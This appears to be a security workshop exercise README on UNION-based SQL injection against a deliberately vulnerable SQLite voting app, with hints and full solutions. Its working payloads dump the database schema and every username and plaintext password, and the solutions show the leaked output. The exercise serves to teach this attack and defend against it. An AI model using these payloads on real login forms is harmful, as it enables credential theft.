# Exercise 6 - SQL injection continued

In this exercise, we will look at some more complicated examples of SQL injection.

## 6.1 - Extract the user table schema

:pencil2: Log out and log in using with the following username

```sql
' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--
```

:book: The username uses [`UNION ALL`](https://www.sqlite.org/lang_select.html#compound_select_statements), the [`GROUP_CONCAT`](https://www.sqlite.org/lang_aggfunc.html#group_concat) function and the [`sqlite_schema`](https://www.sqlite.org/schematab.html) table. Look them up if you're not familiar with them. For a gentler introduction with examples, see [SQLite UNION vs UNION ALL](https://dbschema.com/blog/sqlite/union/), [what the `sqlite_schema` table contains](https://dbschema.com/blog/sqlite/reverse-engineering-a-sqlite-database/#what-sqlite-records-about-its-own-schema-) and [how `GROUP_CONCAT` joins values](https://dbschema.com/blog/sqlite/functions/#implementing-functions-in-sqlite3-).

:pencil2: Inspect the source of the voting page. Do you see anything questionable?

:pencil2: Look at the source code (the `getUserIdByCredentials` function in [`src/data/repository.js`](../vulnerable-application/src/data/repository.js)). Try to reason on _how_ we are able to extract table schemas using SQL injection.

:star: Bonus: Can you change the login query to execute some arbitrary SQL to steal information?

## Get a user's password

The developers of this solution has not followed any good practices, and has stored the passwords as clear text! (See the [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) for how it should be done.)

:pencil2: Try to use a similar technique as in the previous task to extract a users password.

## Hints

<details>
  <summary>Hint 1</summary>

The login form is still vulnerable. Focus on the username field. A single quote should break the query, because it ends the [string literal](https://www.sqlite.org/lang_expr.html#literal_values_constants_) early.
</details>

<details>
  <summary>Hint 2</summary>

  Figure out how many columns (and their names) the original SELECT returns. Both sides of a [`UNION`](https://www.sqlite.org/lang_select.html#compound_select_statements) must return the same number of columns. Observe what the app displays after login (e.g. an "id"?). You only need to return one column matching that expected name/type.
</details>

<details>
  <summary>Hint 3</summary>

  If the original query selects a column named `id`, your injected SELECT must output a column aliased to `id` (with `AS`, which [sets the column's name](https://www.sqlite.org/c3ref/column_name.html)) so the application code continues without errors.
</details>

<details>
  <summary>Hint 4</summary>

  SQLite exposes table creation statements in [`sqlite_schema`](https://www.sqlite.org/schematab.html) (older: `sqlite_master`). Use [`GROUP_CONCAT(sql)`](https://www.sqlite.org/lang_aggfunc.html#group_concat) to merge rows into one string so it fits a single-column UNION.
</details>

<details>
  <summary>Hint 5</summary>

  Terminate the rest of the original query using `--`, which starts an [SQL comment](https://www.sqlite.org/lang_comment.html) (and maybe a trailing space).
</details>

<details>
  <summary>Hint 6</summary>

  Once you know the users table name and columns, you can concatenate username and password fields with the string concatenation operator [`||`](https://www.sqlite.org/lang_expr.html#operators_and_parse_affecting_attributes) inside `GROUP_CONCAT`.
</details>

## Solutions

<details>
  <summary>Solution for 6.1</summary>

  Log in with this username (any password):

  ```sql
  ' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--
  ```

  The app pastes your username into its login query (`SELECT id FROM user WHERE username='<username>' AND password='<password>'`), so the query the database runs becomes the following. Don't type this in; it's what the server builds from your username:

  ```sql
  SELECT id FROM user WHERE username='' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--' AND password=''
  ```

  :bulb: You can see this query in the terminal where the app is running: every query is logged on a line starting with `sql:`, just before the `POST /login` line.

  - No user has an empty username, so the first `SELECT` returns no rows.
  - The second `SELECT` returns one row: the `CREATE` statements of all tables, joined into one string and named `id`.
  - `--` comments out the password check.

  The app thinks the login succeeded and stores the "id" in the session as the logged-in user. The voting page writes it into the hidden `userId` field of the comment form, so the page source shows:

  ```html
  <input type="hidden" name="userId" value="CREATE TABLE candidate (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name text not null,
      votes text not null default 0
    ),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE user (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username text not null,
      password test not null,
      hasVoted bool not null default false
    ),CREATE TABLE comment (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      author text not null,
      comment text not null
    )" />
  ```

  Now you know there's a `user` table with `username` and `password` columns. (`sqlite_sequence` is an internal table SQLite creates for `AUTOINCREMENT`.)
</details>

<details>
  <summary>Solution for 6.2</summary>

  Log in with this username (any password):

  ```sql
  ' UNION ALL SELECT GROUP_CONCAT(username || ':' || password) as id FROM user--
  ```

  The hidden `userId` field on the voting page now contains every username and password:

  ```
  jim_raynor:terran_rox,sarah_kerrigan:zergs_r0ckz!,zeratul:hunter3,user:user
  ```

  This is why passwords must never be stored in plain text: one SQL injection exposes all of them.
</details>

### [Go to exercise 7 :arrow_right:](../exercise-7/README.md)
